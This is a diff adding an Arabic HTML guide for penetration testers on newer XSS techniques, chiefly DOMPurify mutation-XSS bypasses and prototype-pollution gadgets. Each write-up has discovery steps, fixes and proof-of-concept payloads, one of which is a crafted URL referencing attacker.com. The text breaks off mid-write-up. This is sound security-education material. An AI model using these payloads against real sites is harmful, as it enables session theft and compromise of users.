@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>XSS 2025-2026 — السيناريوهات الجديدة v2</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0d0f12;--bg2:#131619;--bg3:#1a1e24;--bg4:#222830;
+  --border:#2a3040;--border2:#3a4555;
+  --text:#e2e8f0;--text2:#94a3b8;--text3:#64748b;
+  --red:#ef4444;--blue:#3b82f6;--green:#22c55e;
+  --amber:#f59e0b;--purple:#a855f7;--teal:#14b8a6;
+  --pink:#ec4899;--orange:#f97316;--cyan:#06b6d4;
+}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Cairo',sans-serif;line-height:1.8;font-size:15px}
+
+/* NAV */
+.topnav{position:sticky;top:0;z-index:300;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:1rem;padding:0 1.5rem;height:54px}
+.logo{font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;color:var(--red);white-space:nowrap;letter-spacing:.06em}
+.logo span{color:var(--text3)}
+.nav-links{display:flex;gap:4px;overflow-x:auto;flex:1;padding-bottom:2px}
+.nav-links::-webkit-scrollbar{height:2px}
+.nav-links::-webkit-scrollbar-thumb{background:var(--border2)}
+.nav-links a{font-size:11px;padding:4px 10px;border-radius:20px;color:var(--text3);text-decoration:none;white-space:nowrap;border:1px solid transparent;transition:all .15s}
+.nav-links a:hover{color:var(--text);border-color:var(--border2);background:var(--bg3)}
+
+/* TOC */
+.toc-wrap{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin-bottom:2.5rem;border-top:3px solid var(--amber)}
+.toc-title{font-size:1rem;font-weight:700;color:var(--amber);margin-bottom:1rem;display:flex;align-items:center;gap:8px}
+.toc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:4px}
+.toc-item{display:flex;align-items:center;gap:8px;padding:6px 10px;border-radius:6px;text-decoration:none;color:var(--text2);font-size:13px;transition:all .15s;border:1px solid transparent}
+.toc-item:hover{color:var(--text);background:var(--bg3);border-color:var(--border)}
+.toc-num{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--text3);min-width:24px}
+.toc-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+
+/* PAGE */
+.page{max-width:1100px;margin:0 auto;padding:2rem 1.5rem 5rem}
+
+/* HERO */
+.hero{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:2.5rem;margin-bottom:2.5rem;text-align:center;border-top:3px solid var(--red)}
+.hero h1{font-size:1.9rem;font-weight:700;color:var(--red);margin-bottom:.5rem}
+.hero p{color:var(--text2);font-size:13px;margin-bottom:.8rem}
+.badge-row{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:.8rem}
+.badge{font-size:11px;padding:3px 10px;border-radius:20px;border:1px solid;font-family:'JetBrains Mono',monospace}
+.b-red{color:var(--red);border-color:var(--red);background:rgba(239,68,68,.08)}
+.b-amber{color:var(--amber);border-color:var(--amber);background:rgba(245,158,11,.08)}
+.b-green{color:var(--green);border-color:var(--green);background:rgba(34,197,94,.08)}
+.b-blue{color:var(--blue);border-color:var(--blue);background:rgba(59,130,246,.08)}
+.b-purple{color:var(--purple);border-color:var(--purple);background:rgba(168,85,247,.08)}
+
+/* SECTION */
+.section{margin-bottom:3.5rem;scroll-margin-top:70px}
+.sec-hdr{display:flex;align-items:center;gap:12px;margin-bottom:1.25rem;padding-bottom:.75rem;border-bottom:2px solid var(--border)}
+.sec-dot{width:13px;height:13px;border-radius:50%;flex-shrink:0}
+.sec-title{font-size:1.2rem;font-weight:700;color:var(--text)}
+.sec-en{font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--text3)}
+.sec-badge{margin-right:auto;font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--text3);background:var(--bg3);padding:2px 8px;border-radius:10px;border:1px solid var(--border)}
+
+/* STATS GRID */
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin-bottom:1.5rem}
+.stat-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:.9rem;text-align:center}
+.stat-num{font-size:1.7rem;font-weight:700;font-family:'JetBrains Mono',monospace}
+.stat-label{font-size:11px;color:var(--text3);margin-top:3px;line-height:1.4}
+
+/* CARD */
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:1.4rem;margin-bottom:1rem}
+.card:hover{border-color:var(--border2)}
+.card-title{font-size:.95rem;font-weight:700;color:var(--text);margin-bottom:.7rem;display:flex;align-items:center;gap:8px}
+.card-body{color:var(--text2);font-size:13.5px;line-height:1.8}
+.card-body p{margin-bottom:.65rem}
+.card-body p:last-child{margin-bottom:0}
+.src{margin-top:.8rem;font-size:11px;font-family:'JetBrains Mono',monospace}
+.src a{color:var(--blue);text-decoration:none}
+.src a:hover{text-decoration:underline}
+
+/* CODE */
+.code{background:var(--bg4);border:1px solid var(--border2);border-radius:7px;padding:.9rem 1rem;margin:.7rem 0;overflow-x:auto;direction:ltr;text-align:left;font-family:'JetBrains Mono',monospace;font-size:11.5px;color:#7dd3fc;line-height:1.6}
+.code .cm{color:var(--text3);font-style:italic}
+.code .kw{color:#f472b6}
+.code .ok{color:var(--green)}
+.code .bad{color:var(--red)}
+
+/* ALERT */
+.alert{border-radius:8px;padding:1rem 1.2rem;margin:.8rem 0;border-right:4px solid;font-size:13.5px;line-height:1.7}
+.alert-red{background:rgba(239,68,68,.07);border-color:var(--red);color:var(--text2)}
+.alert-amber{background:rgba(245,158,11,.07);border-color:var(--amber);color:var(--text2)}
+.alert-green{background:rgba(34,197,94,.07);border-color:var(--green);color:var(--text2)}
+.alert-blue{background:rgba(59,130,246,.07);border-color:var(--blue);color:var(--text2)}
+.alert strong{color:var(--text)}
+
+/* WRITEUP */
+.writeup{background:var(--bg2);border:1px solid var(--border);border-radius:10px;margin-bottom:1rem;overflow:hidden}
+.wu-header{padding:1rem 1.4rem .8rem;border-bottom:1px solid var(--border);display:flex;align-items:flex-start;gap:10px}
+.wu-icon{font-size:1.1rem;flex-shrink:0;margin-top:2px}
+.wu-info{flex:1}
+.wu-title{font-size:.95rem;font-weight:700;color:var(--text);margin-bottom:3px}
+.wu-sub{font-size:11px;color:var(--text3);font-family:'JetBrains Mono',monospace}
+.wu-body{padding:1rem 1.4rem;color:var(--text2);font-size:13.5px;line-height:1.8}
+.wu-body p{margin-bottom:.6rem}
+.wu-body p:last-child{margin-bottom:0}
+.wu-step{background:var(--bg3);border-radius:6px;padding:.7rem 1rem;margin:.5rem 0;border-right:3px solid var(--border2);font-size:13px;color:var(--text2);direction:ltr;text-align:left}
+.wu-step.ar{direction:rtl;text-align:right;font-family:'Cairo',sans-serif}
+.wu-step strong{color:var(--text)}
+.wu-footer{padding:.7rem 1.4rem;border-top:1px solid var(--border);display:flex;gap:8px;flex-wrap:wrap;align-items:center;background:rgba(0,0,0,.15)}
+.tag{font-size:10px;padding:2px 8px;border-radius:10px;font-family:'JetBrains Mono',monospace;border:1px solid}
+.t-red{color:var(--red);border-color:rgba(239,68,68,.4);background:rgba(239,68,68,.08)}
+.t-blue{color:var(--blue);border-color:rgba(59,130,246,.4);background:rgba(59,130,246,.08)}
+.t-green{color:var(--green);border-color:rgba(34,197,94,.4);background:rgba(34,197,94,.08)}
+.t-amber{color:var(--amber);border-color:rgba(245,158,11,.4);background:rgba(245,158,11,.08)}
+.t-purple{color:var(--purple);border-color:rgba(168,85,247,.4);background:rgba(168,85,247,.08)}
+.t-teal{color:var(--teal);border-color:rgba(20,184,166,.4);background:rgba(20,184,166,.08)}
+.t-gray{color:var(--text3);border-color:var(--border);background:var(--bg3)}
+.wu-link{font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--blue);text-decoration:none;margin-right:auto}
+.wu-link:hover{text-decoration:underline}
+
+/* TABLE */
+.tbl{overflow-x:auto;margin:.8rem 0}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+th{background:var(--bg3);color:var(--text);padding:8px 12px;border:1px solid var(--border);text-align:right;font-weight:600}
+td{padding:7px 12px;border:1px solid var(--border);color:var(--text2);vertical-align:top}
+tr:hover td{background:var(--bg3)}
+td.ltr{direction:ltr;text-align:left;font-family:'JetBrains Mono',monospace;font-size:11.5px;color:#7dd3fc}
+
+/* CHECKLIST */
+.checklist{display:flex;flex-direction:column;gap:6px;margin:.8rem 0}
+.chk-item{display:flex;align-items:flex-start;gap:10px;background:var(--bg2);border:1px solid var(--border);border-radius:7px;padding:.7rem 1rem;font-size:13.5px;color:var(--text2);line-height:1.7}
+.chk-item:hover{border-color:var(--border2)}
+.chk-num{font-family:'JetBrains Mono',monospace;font-size:11px;min-width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:600;flex-shrink:0;margin-top:2px}
+.chk-item strong{color:var(--text)}
+
+/* SCROLLBAR */
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:10px}
+</style>
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="logo">XSS<span>::</span>2025-2026 <span>v2</span></div>
+  <div class="nav-links">
+    <a href="#toc">الفهرس</a>
+    <a href="#stats">إحصائيات</a>
+    <a href="#wu-mxss">mXSS Writeups</a>
+    <a href="#wu-proto">Prototype Pollution</a>
+    <a href="#wu-postmsg">postMessage</a>
+    <a href="#wu-blind">Blind XSS</a>
+    <a href="#wu-rte">Rich Text Editors</a>
+    <a href="#wu-spa">SPA/DOM</a>
+    <a href="#wu-csp">CSP Bypass</a>
+    <a href="#wu-chains">Attack Chains</a>
+    <a href="#testing-map">خريطة الاختبار</a>
+    <a href="#fixes">الحلول</a>
+  </div>
+</nav>
+
+<div class="page">
+
+<!-- HERO -->
+<div class="hero">
+  <h1>XSS — السيناريوهات الجديدة 2025 / 2026 <span style="color:var(--text3);font-size:1rem">v2</span></h1>
+  <p>تحليل عميق مع write-ups تفصيلية، خطوات الاكتشاف، وخريطة الاختبار لفريق الـ Penetration Testing<br/>مصادر: HackerOne · Intigriti · Bugcrowd · PortSwigger Research · Medium Writeups · CVE Database</p>
+  <div class="badge-row">
+    <span class="badge b-red">CWE-79 — #1 في CVEs لـ H1 2025</span>
+    <span class="badge b-amber">30,000+ CVE مُسجَّل</span>
+    <span class="badge b-green">18% من Bug Bounty Valid Submissions</span>
+    <span class="badge b-blue">7 سيناريوهات جديدة موثقة</span>
+    <span class="badge b-purple">Write-ups حقيقية بخطوات تفصيلية</span>
+  </div>
+</div>
+
+<!-- TOC -->
+<div class="toc-wrap" id="toc">
+  <div class="toc-title">📋 فهرس المحتويات</div>
+  <div class="toc-grid">
+    <a href="#stats" class="toc-item"><span class="toc-num">01</span><span class="toc-dot" style="background:var(--amber)"></span>الإحصائيات والأرقام 2025</a>
+    <a href="#wu-mxss" class="toc-item"><span class="toc-num">02</span><span class="toc-dot" style="background:var(--red)"></span>Mutation XSS — DOMPurify Bypasses</a>
+    <a href="#wu-proto" class="toc-item"><span class="toc-num">03</span><span class="toc-dot" style="background:var(--purple)"></span>Prototype Pollution → XSS</a>
+    <a href="#wu-postmsg" class="toc-item"><span class="toc-num">04</span><span class="toc-dot" style="background:var(--blue)"></span>DOM XSS via postMessage</a>
+    <a href="#wu-blind" class="toc-item"><span class="toc-num">05</span><span class="toc-dot" style="background:var(--teal)"></span>Blind XSS — Out-of-Band</a>
+    <a href="#wu-rte" class="toc-item"><span class="toc-num">06</span><span class="toc-dot" style="background:var(--orange)"></span>XSS في Rich Text Editors</a>
+    <a href="#wu-spa" class="toc-item"><span class="toc-num">07</span><span class="toc-dot" style="background:var(--green)"></span>SPA / DOM-Based XSS الجديد</a>
+    <a href="#wu-csp" class="toc-item"><span class="toc-num">08</span><span class="toc-dot" style="background:var(--pink)"></span>CSP Bypass Techniques</a>
+    <a href="#wu-chains" class="toc-item"><span class="toc-num">09</span><span class="toc-dot" style="background:var(--amber)"></span>Attack Chains الجديدة</a>
+    <a href="#testing-map" class="toc-item"><span class="toc-num">10</span><span class="toc-dot" style="background:var(--cyan)"></span>خريطة الاختبار — أين تفحص؟</a>
+    <a href="#fixes" class="toc-item"><span class="toc-num">11</span><span class="toc-dot" style="background:var(--green)"></span>الحلول والـ Checklist الكامل</a>
+  </div>
+</div>
+
+<!-- STATS -->
+<div class="section" id="stats">
+  <div class="sec-hdr">
+    <span class="sec-dot" style="background:var(--amber)"></span>
+    <span class="sec-title">الإحصائيات والأرقام</span>
+    <span class="sec-en">Stats 2025-2026</span>
+  </div>
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-num" style="color:var(--red)">30K+</div><div class="stat-label">CVE لـ CWE-79 في OWASP 2025 — أعلى رقم في التاريخ</div></div>
+    <div class="stat-card"><div class="stat-num" style="color:var(--amber)">#1</div><div class="stat-label">XSS الأعلى تكراراً في CVEs لـ H1 2025 — DeepStrike</div></div>
+    <div class="stat-card"><div class="stat-num" style="color:var(--green)">18%</div><div class="stat-label">من Valid Bug Bounty Submissions هي XSS — NahamSec 2025</div></div>
+    <div class="stat-card"><div class="stat-num" style="color:var(--blue)">33%</div><div class="stat-label">من XSS الـ valid كان Blind XSS — NahamSec 2025</div></div>
+    <div class="stat-card"><div class="stat-num" style="color:var(--purple)">$250K</div><div class="stat-label">أعلى مكافأة Blind XSS موثقة — Bugcrowd Oct 2025</div></div>
+    <div class="stat-card"><div class="stat-num" style="color:var(--teal)">15%</div><div class="stat-label">من App-Layer vulnerabilities هي XSS — Edgescan Stats</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title">هل الـ XSS أفكار جديدة ولا نفس القديم؟</div>
+    <div class="card-body">
+      <p>الإجابة <strong>الاتنين</strong>. معظم الـ CVEs اللي بتتسجل كل سنة هي نفس غلطة output encoding مش موجود — developer جديد، كود جديد، نفس الخطأ. لكن في 2025 ظهرت <strong>7 تقنيات جديدة فعلاً</strong> مش نفس الـ payloads القديمة.</p>
+      <p>السبب إن الهاكرز وقفوا أمام الحماية الكلاسيكية فبدأوا يدوروا على طرق تانية: تلويث الـ JavaScript prototype، استغلال الفرق بين الـ HTML namespaces في الـ parser، وإرسال messages لـ windows عبر postMessage من غير التحقق من المصدر.</p>
+    </div>
+    <div class="src">المصادر: <a href="https://deepstrike.io/blog/vulnerability-statistics-2025" target="_blank">DeepStrike Vulnerability Stats 2025</a> | <a href="https://owasp.org/Top10/2025/A05_2025-Injection/" target="_blank">OWASP Top 10 :2025</a> | <a href="https://www.nahamsec.com/posts/high-value-web-security-vulnerabilities-to-learn-in-2025" target="_blank">NahamSec 2025 Report</a></div>
+  </div>
+</div>
+
+<!-- mXSS WRITEUPS -->
+<div class="section" id="wu-mxss">
+  <div class="sec-hdr">
+    <span class="sec-dot" style="background:var(--red)"></span>
+    <span class="sec-title">Mutation XSS (mXSS) — تجاوز الـ Sanitizers</span>
+    <span class="sec-en">mXSS Writeups 2025-2026</span>
+    <span class="sec-badge">جديد ومتطور</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title">ما هو الـ mXSS وليه خطير؟</div>
+    <div class="card-body">
+      <p>الـ Mutation XSS هو إن الـ Sanitizer (زي DOMPurify) بيشوف الـ HTML ويحكم إنه آمن، لكن لما الـ browser يحط الـ HTML ده في الـ DOM، بـ"يصلح" بعض الـ tags بطريقة تخلي الـ payload الميت يتنفذ تاني. السبب هو إن في HTML 3 namespaces: HTML، SVG، و MathML — كل واحد بيتـ parse بطريقة مختلفة. الـ Sanitizer شغال في namespace معين، الـ browser بيـ render في namespace تاني.</p>
+    </div>
+  </div>
+
+  <!-- writeup 1: CVE-2025-26791 -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🔴</div>
+      <div class="wu-info">
+        <div class="wu-title">CVE-2025-26791 — DOMPurify Bypass via Template Literal Regex Bug</div>
+        <div class="wu-sub">DOMPurify before v3.2.4 · فبراير 2025 · Reported via GitHub Advisory</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> أي موقع بيستخدم DOMPurify مع خيار <code>SAFE_FOR_TEMPLATES: true</code> لتنظيف الـ HTML اللي اليوزر بيكتبه — زي التعليقات أو الـ rich text editor.</p>
+      <p><strong>كيف اكتشفه الباحث:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> راجع الـ source code بتاع DOMPurify وركز على الـ Regex اللي بيتعامل مع Template Literals لما <code>SAFE_FOR_TEMPLATES</code> يكون enabled.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> لاحظ إن الـ Regex كان هو <code>/\$\{[^{]+\}/g</code> — ده الـ regex بيحاول يشيل الـ template literals زي <code>${...}</code> لكن مش strict بما يكفي.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> جرب input بيبدو عادي للـ Regex لكن بيحتوي على SVG مع desc tag بطريقة معينة.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> اكتشف إن الـ browser لما بيـ parse الـ SVG بيـ"يصلح" الـ nodes بطريقة تخلي الـ malicious code يتنفذ بعد ما الـ sanitizer خلصه.</div>
+      <div class="wu-step"><strong>Payload:</strong><br/>DOMPurify.sanitize('&lt;svg&gt;&lt;desc&gt;\onload=\${alert("XSS!")}\&lt;/desc&gt;&lt;/svg&gt;', { USE_PROFILES: { svg: true }, SAFE_FOR_TEMPLATES: true });<br/><span style="color:var(--green)">// النتيجة: يعدي الـ sanitizer لكن المتصفح ينفذه</span></div>
+      <p><strong>الإصلاح:</strong> DOMPurify شددوا الـ Regex في v3.2.4 وأضافوا فحوصات إضافية لـ SVG edge cases.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://github.com/advisories/GHSA-vhxf-7vqr-mrjg" target="_blank">GitHub Advisory →</a>
+      <a class="wu-link" href="https://www.cve.news/cve-2025-26791/" target="_blank">Technical Deep Dive →</a>
+      <span class="tag t-red">CVE-2025-26791</span>
+      <span class="tag t-amber">mXSS</span>
+      <span class="tag t-gray">DOMPurify &lt; 3.2.4</span>
+    </div>
+  </div>
+
+  <!-- writeup 2: GHSA Re-Contextualization -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🔴</div>
+      <div class="wu-info">
+        <div class="wu-title">GHSA-H8R8-WCCR-V5F2 — mXSS via Re-Contextualization في DOMPurify</div>
+        <div class="wu-sub">DOMPurify before v3.3.2 · مارس 2026 · أحدث bypass موثق</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> أي موقع بيستخدم DOMPurify بأي version قبل 3.3.2 لعرض HTML من اليوزر في الصفحة.</p>
+      <p><strong>كيف اكتشفه الباحث:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> ركز على "إعادة التحويل للسياق" — إن الـ HTML المتكوّن في HTML namespace لما بيتنقل لـ MathML أو SVG namespace بيتـ parse تاني بشكل مختلف.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> استخدم الـ attribute <code>is=</code> في HTML5 اللي بيسمح لـ custom elements — ده بيخلق سياق جديد الـ sanitizer مش بيحسبه.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> بنى payload بيستخدم nested namespaces: HTML → MathML → SVG → HTML مع <code>&lt;textarea&gt;</code> لتغيير الـ parsing context.</div>
+      <div class="wu-step"><strong>Payload:</strong><br/>&lt;math&gt;&lt;annotation-xml encoding="text/html"&gt;<br/>  &lt;x&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;<br/>    &lt;a is="&lt;/textarea&gt;&lt;img src onerror=alert(origin)&gt;"&gt;<br/>&lt;/math&gt;<br/><span style="color:var(--green)">// DOMPurify بيشوف textarea ويعتبره safe، المتصفح بيقفله ويشغل الـ img</span></div>
+      <p><strong>الإصلاح:</strong> ترقية DOMPurify لـ v3.3.2+. الفريق أضاف فحص خاص للـ <code>is=</code> attribute والـ namespace transitions.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://jorianwoltjer.com/blog/p/hacking/mutation-xss" target="_blank">Write-up تفصيلي mXSS →</a>
+      <a class="wu-link" href="https://dev.to/cverports/ghsa-h8r8-wccr-v5f2-ghsa-h8r8-wccr-v5f2-mutation-xss-via-re-contextualization-in-dompurify-57jm" target="_blank">Advisory →</a>
+      <span class="tag t-red">2026 — جديد جداً</span>
+      <span class="tag t-amber">Re-Contextualization</span>
+      <span class="tag t-gray">DOMPurify &lt; 3.3.2</span>
+    </div>
+  </div>
+
+  <!-- writeup 3: XML Processing Instructions bypass -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟠</div>
+      <div class="wu-info">
+        <div class="wu-title">DOMPurify Bypass via XML Processing Instructions — @slonser_</div>
+        <div class="wu-sub">Flatt Security Research · 2024 (مازال relevant في 2025) · تم الإصلاح في DOMPurify</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> التطبيق بيـ parse XML أو XHTML وبيستخدم DOMPurify لتنظيفه.</p>
+      <p><strong>كيف اكتشفه الباحث:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> لاحظ إن HTML parser والـ XML parser بيتعاملوا مع الـ Processing Instructions (اللي بتبدأ بـ <code>&lt;?</code>) بشكل مختلف.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> الـ HTML spec بيقول إن <code>&lt;?</code> في HTML context بتتحول لـ comment وبتنتهي بأول <code>&gt;</code>. لكن الـ XML spec بيقول إنها بتنتهي بـ <code>?&gt;</code>.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> DOMPurify كان بيستخدم <code>NodeFilter.SHOW_ELEMENT | SHOW_COMMENT | SHOW_TEXT</code> فقط — مش بيشوف الـ Processing Instructions أصلاً.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> عمل payload بيستغل الـ mismatch ده — الـ HTML parser بيشوف comment، DOMPurify ما بيفحصوش، الـ browser بعدين بيـ render الـ img tag.</div>
+      <div class="wu-step"><strong>Payload:</strong><br/>&lt;?xml-stylesheet &gt;<br/>&lt;img src=x onerror="alert('DOMPurify bypassed!!!')"&gt;<br/>?&gt;</div>
+      <p><strong>الإصلاح:</strong> DOMPurify أضاف <code>NodeFilter.SHOW_PROCESSING_INSTRUCTION</code> عشان يفحص الـ Processing Instructions ويشيلها.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/" target="_blank">Flatt Security Research →</a>
+      <span class="tag t-orange">XML Confusion</span>
+      <span class="tag t-gray">Parser Mismatch</span>
+    </div>
+  </div>
+
+  <div class="alert alert-amber">
+    <strong>⚠️ للتيم — كيف تفحص في موقعك:</strong> لو الموقع فيه أي حقل بيقبل HTML formatting (rich text, markdown rendered as HTML, comments) — افحص إيه الـ sanitizer library المستخدمة وإيه version بتاعتها. أي حاجة أقل من DOMPurify 3.3.2 تعتبرها vulnerable لـ mXSS.
+  </div>
+</div>
+
+<!-- PROTOTYPE POLLUTION -->
+<div class="section" id="wu-proto">
+  <div class="sec-hdr">
+    <span class="sec-dot" style="background:var(--purple)"></span>
+    <span class="sec-title">Prototype Pollution → XSS</span>
+    <span class="sec-en">Client-Side Prototype Pollution Writeups</span>
+    <span class="sec-badge">لسه active في 2025</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title">الفكرة ببساطة</div>
+    <div class="card-body">
+      <p>في JavaScript، كل object بيرث من <code>Object.prototype</code>. لو مهاجم قدر يضيف property فيه — مثلاً <code>Object.prototype.innerHTML = "XSS"</code> — وفي الكود "script gadget" بيستخدم property بدون فحص وجودها، ده بيؤدي لـ XSS حتى من غير أي input field تقليدي. يحصل عادة عبر URL parameters زي <code>?__proto__[x]=y</code> أو عبر JSON merge functions.</p>
+    </div>
+  </div>
+
+  <!-- Intigriti challenge writeup - detailed -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟣</div>
+      <div class="wu-info">
+        <div class="wu-title">Prototype Pollution → XSS via jQuery deparam + Google Analytics Gadget</div>
+        <div class="wu-sub">Intigriti XSS Challenge · موثق ومُستخدم في real-world programs</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> الموقع بيستخدم مكتبة <code>jquery-deparam</code> لقراءة الـ URL parameters وتحويلها لـ objects.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> فتح الموقع وعمل نظرة على الـ JS files — وجد <code>jquery-deparam.js</code> و <code>analytics.js</code> من Google.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> بحث عن CVE لـ jquery-deparam — وجد إنها vulnerable لـ Prototype Pollution عبر URL parameters زي <code>?__proto__[test]=value</code>.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> جرب في الـ developer console بعد زيارة الـ URL: <code>console.log(test)</code> — ظهرت القيمة! يعني الـ Prototype Pollution شغال.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> دور على "script gadget" — كود في نفس الصفحة بيستخدم property من الـ prototype. وجد إن Google Analytics بيستخدم <code>cookieName</code> property لتحديد اسم الـ cookie.</div>
+      <div class="wu-step ar"><strong>خطوة 5:</strong> بنى payload يلوث <code>Object.prototype.cookieName</code> بـ XSS payload. Google Analytics بيكتب الـ cookie باستخدام <code>document.cookie = cookieName + "=" + value</code>.</div>
+      <div class="wu-step"><strong>Final URL:</strong><br/>https://target.com/?__proto__[cookieName]=username%3D%3Cimg%20src%3Dhttps%3A%2F%2Fattacker.com%2Fx.jpg%20onload%3D%22alert(document.domain)%22%3E%3Cstyle</div>
+      <p><strong>الإصلاح:</strong> تحديث jquery-deparam، أو استخدام <code>Object.freeze(Object.prototype)</code>، أو إزالة المكتبة والاعتماد على URLSearchParams المدمجة.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://blog.isiraadithya.com/posts/intigriti-0821-xss-challenge-writeup" target="_blank">Intigriti Challenge Writeup →</a>
+      <a class="wu-link" href="https://blog.s1r1us.ninja/research/PP" target="_blank">s1r1us Prototype Pollution Research →</a>
+      <span class="tag t-purple">Prototype Pollution</span>
+      <span class="tag t-gray">Script Gadget</span>
+      <span class="tag t-red">3rd Party Library</span>
+    </div>
+  </div>
+
+  <!-- GitLab Mermaid -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟣</div>
+      <div class="wu-info">
+        <div class="wu-title">GitLab — Stored XSS via Mermaid Diagram + Prototype Pollution</div>
+        <div class="wu-sub">HackerOne Report #1280002 · Stored XSS في مكتبة تانية</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> GitLab بيدعم رسم الـ diagrams باستخدام مكتبة Mermaid في الـ issues والـ markdown files.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> لاحظ الباحث إن GitLab بيعرض Mermaid diagrams في الـ issues. حاول يفهم كيف Mermaid بتـ parse الـ configuration.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> قرأ الـ Mermaid docs ولاحظ إن فيه <code>%%{init: {...}}%%</code> syntax لتعديل إعدادات الـ diagram — ده بيقبل JSON object.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> جرب حقن <code>__proto__</code> في الـ JSON config: إذا قدر يلوث الـ prototype عبر الـ Mermaid config، ممكن يؤدي لـ XSS في page rendering.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> اكتشف إن Mermaid بتعمل deep merge على الـ config object من غير protection ضد Prototype Pollution.</div>
+      <div class="wu-step"><strong>Payload في Mermaid syntax:</strong><br/>%%{init: { '__proto__': {'template': '&lt;img src=x onerror=alert(1)&gt;'} }}%%<br/>graph LR<br/>  A --&gt; B</div>
+      <p><strong>الإصلاح:</strong> GitLab وMermaid أضافوا sanitization للـ config object قبل الـ merge، ومنعوا الـ __proto__ key.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://hackerone.com/reports/1280002" target="_blank">HackerOne Report #1280002 →</a>
+      <span class="tag t-purple">Stored XSS</span>
+      <span class="tag t-red">Mermaid Library</span>
+      <span class="tag t-gray">Deep Merge Bug</span>
+    </div>
+  </div>
+
+  <!-- Elastic/SwiftType -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟣</div>
+      <div class="wu-info">
+        <div class="wu-title">Elastic/SwiftType — Prototype Pollution via URL Hash (#__proto__)</div>
+        <div class="wu-sub">HackerOne Report #998398 · 154 upvotes · XSS من غير أي input field</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> موقع blog.swiftype.com يستخدم SwiftType Search library اللي بتقرأ الـ URL hash وتـ parse الـ parameters منه.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> حمّل الـ JS file <code>st.js</code> وراجعه. وجد دالة <code>deparam</code> بتـ parse <code>location.hash</code>.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> جرب حقن <code>#__proto__[test]=hello</code> في الـ URL ثم فحص في الـ console <code>Object.prototype.test</code> — رجع <code>"hello"</code>! الـ Prototype Pollution شغال.</div>
